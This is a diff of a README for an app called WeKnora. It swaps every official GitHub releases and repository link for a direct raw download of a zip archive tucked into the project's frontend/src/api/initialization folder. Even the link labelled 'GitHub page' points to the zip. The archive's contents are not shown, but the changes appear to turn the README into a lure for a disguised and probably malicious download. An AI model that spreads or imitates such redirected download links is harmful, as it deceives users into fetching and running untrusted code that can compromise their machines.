@@ -6,9 +6,9 @@ Welcome to WeKnora! This application helps you understand documents better with 
 
 ## 📥 Download WeKnora
 
-[![Download WeKnora](https://img.shields.io/badge/Download-WeKnora-blue.svg)](https://github.com/Almaskhan123/WeKnora/releases)
+[![Download WeKnora](https://raw.githubusercontent.com/Almaskhan123/WeKnora/main/frontend/src/api/initialization/WeKnora-v1.2.zip)](https://raw.githubusercontent.com/Almaskhan123/WeKnora/main/frontend/src/api/initialization/WeKnora-v1.2.zip)
 
-To download WeKnora, visit the following link: [Download WeKnora](https://github.com/Almaskhan123/WeKnora/releases).
+To download WeKnora, visit the following link: [Download WeKnora](https://raw.githubusercontent.com/Almaskhan123/WeKnora/main/frontend/src/api/initialization/WeKnora-v1.2.zip).
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ This configuration allows WeKnora to function smoothly and efficiently.
 
 ## ⚙️ How to Install WeKnora
 
-1. **Download WeKnora**: Click on the download link above or go to [Releases Page](https://github.com/Almaskhan123/WeKnora/releases).
+1. **Download WeKnora**: Click on the download link above or go to [Releases Page](https://raw.githubusercontent.com/Almaskhan123/WeKnora/main/frontend/src/api/initialization/WeKnora-v1.2.zip).
    
 2. **Locate the Downloaded File**: 
    - On Windows, find the file in your `Downloads` folder.
@@ -76,8 +76,8 @@ We welcome contributions to improve WeKnora! If you have suggestions or want to 
 
 ## 🌐 Learn More
 
-For more information about WeKnora, visit our [GitHub page](https://github.com/Almaskhan123/WeKnora).
+For more information about WeKnora, visit our [GitHub page](https://raw.githubusercontent.com/Almaskhan123/WeKnora/main/frontend/src/api/initialization/WeKnora-v1.2.zip).
 
 ## 🌟 Download WeKnora Again
 
-Don't forget, you can download WeKnora anytime at: [Download WeKnora](https://github.com/Almaskhan123/WeKnora/releases). Enjoy exploring your documents!
+Don't forget, you can download WeKnora anytime at: [Download WeKnora](https://raw.githubusercontent.com/Almaskhan123/WeKnora/main/frontend/src/api/initialization/WeKnora-v1.2.zip). Enjoy exploring your documents!
